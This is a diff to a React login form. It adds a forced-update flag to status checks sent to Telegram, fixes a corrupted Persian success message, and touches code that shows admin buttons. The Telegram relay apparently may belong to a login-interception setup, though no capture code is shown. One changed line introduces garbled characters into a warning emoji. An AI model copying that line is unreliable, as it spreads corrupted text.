@@ -250,10 +250,11 @@ export const LoginForm = () => {
           Date.now(),
           statusText,
           statusEmoji,
+          true, // forceUpdate = true for manual status check
         ).then(() => {
-          console.log("✅ Status check completed and sent to Telegram");
+          console.log("✅ Manual status check completed and sent to Telegram");
         }).catch((error) => {
-          console.error("❌ Failed to send status check:", error);
+          console.error("❌ Failed to send manual status check:", error);
         });
         break;
       case "complete":
@@ -261,7 +262,7 @@ export const LoginForm = () => {
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 احراز هویت ب�� موفقیت تکمیل شد! خوش آمدید.");
+        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -422,7 +423,7 @@ export const LoginForm = () => {
             }, 3000);
           }
         } catch (error) {
-          console.warn("⚠️ Could not show admin buttons:", error);
+          console.warn("⚠��� Could not show admin buttons:", error);
         }
       }, 2000);
     } catch (error) {
